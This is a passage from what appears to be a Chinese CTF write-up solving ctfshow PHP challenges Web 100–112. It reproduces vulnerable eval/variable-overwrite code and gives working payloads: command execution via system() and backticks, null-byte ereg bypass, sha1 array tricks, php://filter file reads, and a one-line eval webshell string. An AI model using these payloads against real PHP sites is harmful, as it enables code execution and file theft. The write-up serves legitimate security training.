class="string">&quot;ctfshow.php&quot;</span>);<span class="comment">//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;   &#125;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>var_dump(<span class="literal">true</span> <span class="keyword">and</span> <span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span>);<span class="comment">// falsevar_dump(true and false and false);// falsevar_dump(true &amp;&amp; true &amp;&amp; false);// falsevar_dump(true &amp;&amp; false &amp;&amp; false);// false$a=true and false and false;var_dump($a);  // true$b = true &amp;&amp; false &amp;&amp; false;var_dump($b); //false$c = true &amp; false &amp; false;var_dump($c); //bool(0)</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="literal">true</span> and <span class="literal">false</span> and <span class="literal">false</span>;var_dump(<span class="variable">$a</span>);  // trueif(<span class="variable">$a</span> === <span class="literal">true</span> and <span class="literal">false</span> and <span class="literal">false</span>)&#123;<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;//不输出&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="literal">false</span> and <span class="literal">true</span> and <span class="literal">true</span>;var_dump(<span class="variable">$a</span>); <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="literal">false</span> and <span class="literal">true</span> and <span class="literal">true</span>)&#123;<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;&#125;//bool(<span class="literal">false</span>) 111</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">if</span>(<span class="variable">$v0</span>)绕过：v1 是数字2. v2 不能有分号，那么无法使用 命令执行函数，那么使用 ``3. 使用注释将 v3 注释掉，相当于把 (<span class="string">&#x27;ctfshow&#x27;</span>) 注释掉4. 注意，v3 一定要写上 ;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=?&gt;&lt;?php echo `cat ctfshow.php`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=-system(&#x27;ls&#x27;)-&amp;v3=-1;?v1=1&amp;v2=echo&amp;v3=;system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure><p>构造成下面的感觉</p><p><img src="https://i.loli.net/2021/08/05/GTRs27cIVn3MmHB.png" alt="image-20210805221256350"></p><p>查 ctfshow.php 试试</p><p><img src="https://i.loli.net/2021/08/05/xAJrKWGiBOjhmTu.png" alt="image-20210805221505214"></p><p>其中，<code>0x2d  </code> 是 <code>-</code></p><h2 id="1-13-Web-101-—-ReflectionClass-关于一个类的反射"><a href="#1-13-Web-101-—-ReflectionClass-关于一个类的反射" class="headerlink" title="1.13 Web 101 — ReflectionClass 关于一个类的反射"></a>1.13 Web 101 — ReflectionClass 关于一个类的反射</h2><p><a href="http://www.thinkphp.cn/code/4863.html">http://www.thinkphp.cn/code/4863.html</a></p><p><img src="https://i.loli.net/2021/08/05/WCA6wXcS4Bxt89l.png" alt="image-20210805224208153"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修补100题非预期,替换0x2d</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);include(<span class="string">&quot;ctfshow.php&quot;</span>);//flag <span class="keyword">in</span> class ctfshow;<span class="variable">$ctfshow</span> = new ctfshow();<span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];<span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];<span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];<span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) and is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);<span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;            <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="variable">$v3</span>&quot;</span>);        &#125;    &#125;  &#125;?&gt;</span><br></pre></td></tr></table></figure><p>上面的 v2 构造的符号 被过滤</p><p><strong>构造 eval(echo new ReflectionClass(‘ctfshow’));</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=<span class="built_in">echo</span> new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><h2 id="1-14-Web-102"><a href="#1-14-Web-102" class="headerlink" title="1.14 Web 102"></a>1.14 Web 102</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];<span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];<span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];<span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);<span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,2);    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);    <span class="built_in">echo</span> <span class="variable">$str</span>;    file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);&#125;<span class="keyword">else</span>&#123;    die(<span class="string">&#x27;hacker&#x27;</span>);&#125;?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-15-Web-103"><a href="#1-15-Web-103" class="headerlink" title="1.15 Web 103"></a>1.15 Web 103</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-16-Web-104-—-shal-数组-绕过"><a href="#1-16-Web-104-—-shal-数组-绕过" class="headerlink" title="1.16 Web 104 — shal() 数组 [ ] 绕过"></a>1.16 Web 104 — shal() 数组 [ ] 绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">换个姿势</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>))&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1?v2=1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1[]=1?v2[]=2</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m</span><br></pre></td></tr></table></figure><h2 id="1-17-Web-105-—-变量覆盖"><a href="#1-17-Web-105-—-变量覆盖" class="headerlink" title="1.17 Web 105 — 变量覆盖"></a>1.17 Web 105 — 变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);error_reporting(<span class="number">0</span>);<span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;<span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;<span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);    &#125;    <span class="variable">$$key</span>=<span class="variable">$$value</span>;    &#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);    &#125;    <span class="variable">$$key</span>=<span class="variable">$$value</span>;&#125;<span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;    <span class="keyword">die</span>(<span class="variable">$error</span>);&#125;<span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;<span class="keyword">die</span>(<span class="variable">$suces</span>);<span class="meta">?&gt;</span>你还想要flag嘛？</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="variable">$key</span>=$<span class="variable">$value</span>;<span class="comment">#变量覆盖，将值作为变量赋给键作为变量，如果传入，?suces=flag，即相当于 $suces=$flag，即将$flag的值赋给$suces，所以我只需要想办法 输出 $suces 即可</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/V4pOyTZECmWY2B7.png" alt="image-20210718203822905"></p><p>可以看到，仅仅传入以上内容，会显示 $error 报错，我们可以通过 POST传参，将 $flag 的值赋给 $error 即可</p><p><img src="https://i.loli.net/2021/07/18/YGmoRLev1xTq5Wz.png" alt="image-20210718203954650"></p><p>思考</p><ul><li><p>通过 <code>die(suces)</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get: suces=flagpost: flag=</span><br></pre></td></tr></table></figure></li><li><p>通过 <code>die(error)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get: suces=flagpost: error=suces</span><br></pre></td></tr></table></figure></li></ul><h2 id="1-15-Web-106-—-shal-数组-绕过"><a href="#1-15-Web-106-—-shal-数组-绕过" class="headerlink" title="1.15 Web 106 — shal() 数组 [ ] 绕过"></a>1.15 Web 106 — shal() 数组 [ ] 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1[]=1v2[]=2</span><br></pre></td></tr></table></figure><h2 id="1-16-Web-107-—-parse-str"><a href="#1-16-Web-107-—-parse-str" class="headerlink" title="1.16 Web 107 — parse_str()"></a>1.16 Web 107 — parse_str()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;           <span class="keyword">echo</span> <span class="variable">$flag</span>;       &#125;&#125;<span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#parse_str($v1,$v2);把$1字符串解析到变量 $2当中，以数组形式get: ?v3=123456post: v1=flag=e10adc3949ba59abbe56e057f20f883e</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/54Y8EOvFWDByebl.png" alt="image-20210718205544680"></p><h2 id="1-17-Web-108-—-ereg-截断漏洞"><a href="#1-17-Web-108-—-ereg-截断漏洞" class="headerlink" title="1.17 Web 108 — ereg() 截断漏洞"></a>1.17 Web 108 — ereg() 截断漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);&#125;<span class="comment">//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;<span class="meta">?&gt;</span>error</span></span><br></pre></td></tr></table></figure> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#strrev()反转字符串#intval()获取变量整数值#0x36d 的十进制是 877</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ereg() 存在00截断漏洞，即%00之后的内容不会进行匹配函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回<span class="literal">true</span>,否则,则返回<span class="literal">false</span>。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=sds%00778</span><br></pre></td></tr></table></figure><h2 id="1-18-Web-109-—-v1-v2-内置类"><a href="#1-18-Web-109-—-v1-v2-内置类" class="headerlink" title="1.18 Web 109 — $v1($v2()) 内置类"></a>1.18 Web 109 — $v1($v2()) 内置类</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);    &#125;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#随便找个php中的内置类并且可以直接echo输出的就可以ExceptionReflectionClass?v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)?v1=Exception&amp;v2=system(&#x27;ls&#x27;)?v1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)v1=Exception();system(&#x27;tac f*&#x27;);//&amp;v2=av1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)</span></span><br></pre></td></tr></table></figure><h2 id="1-19-Web-110-—-new-v1-v2"><a href="#1-19-Web-110-—-new-v1-v2" class="headerlink" title="1.19 Web 110 — new $v1($v2())"></a>1.19 Web 110 — new $v1($v2())</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);    &#125;    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FilesystemIterator类读取文件?v1=FilesystemIterator&amp;v2=getcwd</span></span><br></pre></td></tr></table></figure><h2 id="1-20-Web-111-—-变量覆盖-—-GLOBALS"><a href="#1-20-Web-111-—-变量覆盖-—-GLOBALS" class="headerlink" title="1.20 Web 111 — 变量覆盖 — $GLOBALS"></a>1.20 Web 111 — 变量覆盖 — $GLOBALS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量覆盖</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);    var_dump(<span class="variable">$$v1</span>);&#125;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);    &#125;    &#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>超全局变量 <code>$GLOBALS</code></p><ul><li><p>$GLOBALS — 引用全局作用域中可用的全部变量</p></li><li><p>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p></li></ul><p><img src="https://i.loli.net/2021/08/02/lk3Cv7n8eOghUxq.png" alt="image-20210802083706337"></p><p><img src="https://i.loli.net/2021/08/02/jsdzfwvOeMl69aU.png" alt="image-20210802083840803"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123;  [<span class="string">&quot;_GET&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_POST&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_COOKIE&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;_FILES&quot;</span>]=&gt;  array(0) &#123;  &#125;  [<span class="string">&quot;GLOBALS&quot;</span>]=&gt;  array(8) &#123;    [<span class="string">&quot;_GET&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_POST&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_COOKIE&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;_FILES&quot;</span>]=&gt;    array(0) &#123;    &#125;    [<span class="string">&quot;GLOBALS&quot;</span>]=&gt;    *RECURSION*    [<span class="string">&quot;a&quot;</span>]=&gt;    int(123)    [<span class="string">&quot;b&quot;</span>]=&gt;    int(456)    [<span class="string">&quot;c&quot;</span>]=&gt;    string(4) <span class="string">&quot;asdf&quot;</span>  &#125;  [<span class="string">&quot;a&quot;</span>]=&gt;  int(123)  [<span class="string">&quot;b&quot;</span>]=&gt;  int(456)  [<span class="string">&quot;c&quot;</span>]=&gt;  string(4) <span class="string">&quot;asdf&quot;</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=ctfshow&amp;v2=GLOBALS# 将 $GLOBALS 赋值给 v2 , v2 再赋值给 v1 , 然后再 var_dump($v1)，就相当于 var_dump($GLOBALS)</span></span><br></pre></td></tr></table></figure><h2 id="1-21-Web-112-—-各种编码绕过-convert-iconv-UCS-2LE-UCS-2BE"><a href="#1-21-Web-112-—-各种编码绕过-convert-iconv-UCS-2LE-UCS-2BE" class="headerlink" title="1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE"></a>1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&quot;hacker!&quot;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpecho iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;</span>);<span class="comment"># ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php# 得到 f$al=gc&quot;fthswod&#123;3c00bd-8cf124-2b-53b4da-72598e1bb4&#125;7;&quot;# 解码得到 flag</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 另解?file=php://filter/resource=flag.php?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php#?file=compress.bzip2://flag.php# 别的一些编码绕过?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="1-22-Web-113-—-proc-self-root-多次重复"><a href="#1-22-Web-113-—-proc-self-root-多次重复" class="headerlink" title="1.22 Web 113 — /proc/self/root 多次重复"></a>1.22 Web 113 — /proc/self/root 多次重复</h2><figure class="highlight 